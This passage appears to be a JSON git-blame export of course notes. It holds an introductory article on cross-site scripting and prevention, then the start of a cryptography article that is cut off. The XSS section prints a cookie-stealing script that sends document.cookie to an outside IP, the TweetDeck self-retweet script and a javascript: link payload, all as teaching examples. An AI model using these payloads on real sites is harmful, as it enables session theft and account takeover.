        "content": "* [How to prevent XSS?‎](#how-to-prevent-xss)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Where to go from here?‎](#where-to-go-from-here)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources‎](#resources)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## What is XSS?"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "Cross Site Scripting (XSS) is the most exploited web application vulnerability in 2017 (based on a \u003ca href\u003d\"https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf\" target\u003d\"_blank\"\u003ereport\u003c/a\u003e in 2018). XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include social-networking sites \u003ca href\u003d\"https://www.symantec.com/connect/blogs/persistent-xss-vulnerability-facebook\" target\u003d\"_blank\"\u003eFacebook\u003c/a\u003e and \u003ca href\u003d\"https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/\" target\u003d\"_blank\"\u003eYoutube\u003c/a\u003e."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "XSS is a type of injection, in which malicious code are injected into trusted websites. XSS flaws that allow these attacks to happen are widespread and can occur anywhere a web application uses input from a user to generate an output on the website without validating it or encoding it. "
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Do You Need to Know About XSS?"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "As software engineers, or aspiring software engineers, it is highly likely that we will build web applications. It is important to know how we can protect our web applications against XSS, so that it will not become a tool for attackers."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How Does XSS Work?"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "One of the most common ways to accept inputs from users are text boxes. In this example, we will look at a website that allows users to enter their comments to blog posts. "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Here is the comments section of the website: "
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e **Comments Section** \u003cbr\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "That\u0027s a very nice picture! \u003cbr\u003e"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Good photograph!"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "However, are users limited to just typing in text? This website does not check the input, thus users are able to use formatting HTML tags, such"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "as `\u003cb\u003e` for bolding and `\u003ci\u003e` for italicizing."
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "What happens when a user submits the following as a comment?"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "I \u003cb\u003elike\u003c/b\u003e your photograph!"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "It becomes: "
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e **Comments Section** \u003cbr\u003e"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "That\u0027s a very nice picture! \u003cbr\u003e"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Good photograph! \u003cbr\u003e"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "I **like** your photograph!"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "HTML also supports \u003ctooltip content\u003d\"In HTML, anything between the opening and closing script tags will run as \u003cb\u003eJavaScript\u003c/b\u003e. "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "\"\u003e`\u003cscript\u003e`\u003c/tooltip\u003e, for you to write `JavaScript` code on the webpage as well. "
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "What happens when a malicious user submits the following as a comment?"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "This is an innocent looking comment. \u003cscript\u003esendToServer(\"https://139.241.0.3/\", document.cookie)\u003c/script\u003e"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "It becomes: "
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e **Comments Section** \u003cbr\u003e"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "That\u0027s a very nice picture! \u003cbr\u003e"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "Good photograph! \u003cbr\u003e"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "I **like** your photograph! \u003cbr\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "This is an innocent looking comment."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `\u003cb\u003e` and `\u003ci\u003e` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. "
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The script `\u003cscript\u003esendToServer(\"https://139.241.0.3/\", document.cookie)\u003c/script\u003e` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his \u003ctooltip content\u003d\"A cookie is a piece of data sent from the server and stored on the client\u0027s computer. It can contain sensitive information such as login data.\"\u003ecookie\u003c/tooltip\u003e is stolen. "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "Therefore, the malicious user has managed to add additional \"functionalities\" to the website that is not intended by the original website developer."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox\u003e Trivia: The term \"Cross Site Scripting\" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim\u0027s website, in order to steal data from the victim\u0027s website/deface the page (hence \"Cross Site\"). Such attacks are no longer possible today, and the modern definition of \"Cross Site Scripting\" includes attacks that do not need to be on a separate website to work.\u003c/box\u003e"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "## Types of XSS"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "There are no standard definitions, but there are at least two different types of"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "XSS:"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "* **Persistent XSS** (also known as stored XSS) - The injected `JavaScript` code gets stored in"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "the web server. Example: Posting a malicious `JavaScript` code into a blog post as"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious `JavaScript` code automatically."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "* **Non-persistent XSS** (also known as reflected XSS) - The `JavaScript` code is"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "inserted in URL/links of website that accepts URL parameters as input. The input"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "is not stored in the server database."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "    An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "    `https://www.ecard.com/view-ecard.php?content\u003dHappy%20Holidays`"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "    However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "    `https://www.ecard.com/view-ecard.php?content\u003dHappy%20Holidays\u003cscript\u003e...\u003c/script\u003e`"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "## Well-Known XSS Incidents"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "**MySpace Worm**"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "In 2005, MySpace allowed users to customise their profiles using HTML code. This allowed for diversity of profiles but also allowed a user named Samy Kamkar to find an XSS vulnerability. "
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "Samy Kamkar wrote a script which made people who visited his profile send him a friend request, and list Samy’s in their own profile’s “My Heroes” section. Not only that, he also programmed the script to copy itself onto the visitor\u0027s profile. Within a day, he had 1 million friend requests. "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "This caused MySpace to take the site offline to figure out what was going on and to purge the worm. "
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "You can read the detailed article \u003ca href\u003d\"https://motherboard.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever\" target\u003d\"_blank\"\u003ehere\u003c/a\u003e."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "**Self-Retweeting Tweet**"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "In 2014, a tweet became the world\u0027s first retweeting tweet. Twitter itself has security measures against XSS and is thus unaffected. However, users on TweetDeck (Twitter social media dashboard application) that came across this tweet will automatically retweet this tweet:"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cscript class\u003d\"xss\"\u003e"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "$(\u0027.xss\u0027).parents().eq(1).find(\u0027a\u0027).eq(1).click();"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "$(\u0027[data-action\u003dretweet]\u0027).click();"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "alert(\u0027XSS in Tweetdeck\u0027)"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/script\u003e ♥"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see \"♥\", the script portion is executed by the browser on the script. Without `alert()`, the TweetDeck user will not even notice anything."
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "You can still see this tweet \u003ca href\u003d\"https://twitter.com/dergeruhn/status/476764918763749376?lang\u003den\" target\u003d\"_blank\"\u003ehere\u003c/a\u003e."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Prevent XSS?"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "There are a couple of ways to prevent your website against XSS. The two most"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "common ways are:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "* **Escaping String Input** \u003cbr\u003e"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "By converting legal HTML characters to their"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "display-equivalent (e.g. `\u003c` to `\u0026lt;`), you prevent the symbol from being"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "parsed as HTML. It now even shows the content on the screen (in case the actual"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "intention is to actually show someone how to code for example)."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, the comment section will become like this:"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003e **Comments Section** \u003cbr\u003e"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "    That\u0027s a very nice picture! \u003cbr\u003e"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "    Good photograph! \u003cbr\u003e"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "    I **like** your photograph! \u003cbr\u003e"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    This is an innocent looking comment. `\u003cscript\u003esendToServer(\"https://139.241.0.3/\", document.cookie)\u003c/script\u003e`"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "    The `\u003cscript\u003e` and `\u003c/script\u003e` will be displayed as text rather than being run as `JavaScript` by the browser."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "* **Whitelist Sanitization** \u003cbr\u003e"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "By scanning and parsing the input as HTML, you can"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "remove undesired HTML elements, and only allowing certain whitelisted HTML"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "elements to be used (e.g. whitelisting only `\u003cb\u003e` and `\u003ci\u003e`)."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "Note that these two ways alone are not enough to protect your web application against XSS attacks. Sophisticated attacks will make use of the different possible user inputs to inject code or illegal characters that are not limited to `\u003cscript\u003e...\u003c/script\u003e`. It is important to note where the user input is going to be generated in the output."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "For example, if you are building a profile page and allow user to add their own links to certain buttons:"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "`\u003ca href\u003d\"{user input link}\"\u003e...\u003c/a\u003e`"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "If a malicious user submits the following as input: "
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "`javascript:alert(\"XSS!\")`"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "It will result in the button running the javascript code when pressed → \u003ca href\u003d\"javascript:alert(\u0027XSS!\u0027)\"\u003e\u003cspan class\u003d\"glyphicon glyphicon-user\"\u003e\u003c/span\u003e\u003c/a\u003e "
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools: "
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "1. http://wapiti.sourceforge.net/ (Web Application Vulnerability Scanner)"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. https://w3af.org/ (Web Application Attack and Audit Framework)"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.arachni-scanner.com/ (Web Application Security Scanner Framework)"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Where to Go From Here?"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Although XSS is the most common web application vulnerability, there are also many other types of vulnerabilities. It is important to be aware of them to properly secure your web application. Given below is a summary of web application vulnerabilities (for the full report see \u003ca href\u003d\"https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf\" target\u003d\"_blank\"\u003ehere\u003c/a\u003e):"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "![Graphical Statistic](./Images/StatisticGraphic.png)"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "References:"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://en.wikipedia.org/wiki/Cross-site_scripting (Overview of XSS taken from here)"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 32 \u0026 33)"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "(Basic description of the XSS attack taken from here)"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "(Description of the two types of XSS attack taken from here)"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "(Origin of the name \"Cross Site Scripting\")"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf (Statistical Summary taken from here)"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "Additional Reading Resources:"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/Testing_for_Cross_site_scripting"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "(How to manually test your own website for XSS attacks?)"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "(A list of possible preventions, which contains even more ways to protect your site from XSS attacks)."
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. https://guides.rubyonrails.org/security.html#cross-site-scripting-xss"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "(In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks, and possible preventive measures)"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/DOM_Based_XSS"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "(Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://excess-xss.com/"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "(Comprehensive coverage of *all* aspects of XSS)"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 6,
      "iskandarzulkarnaien": 12,
      "-": 189
    }
  },
  {
    "path": "contents/security/cryptography.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Cryptography"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Cryptography"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Dickson Tan](https://github.com/neurrone)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Encryption‎](#encryption)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Symmetric Key Ciphers‎](#symmetric-key-ciphers)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Asymmetric Key Cryptosystems‎](#asymmetric-key-cryptosystems)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Other Resources‎](#other-resources)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "Cryptography is the science of developing methods for secure communication, while Cryptanalysis is the discipline of breaking such methods."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "Understanding cryptography will enable you to correctly use cryptography libraries and combine cryptographic primitives to match the security needs of your application."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "Modern cryptography involves developing techniques to achieve the following objectives:"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* Confidentiality: ensuring that a message can only be read by its intended recipient. For example, websites use encryption in the Transport Layer Security (TLS) protocol to prevent interception of sensitive information such as credit card numbers and passwords."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
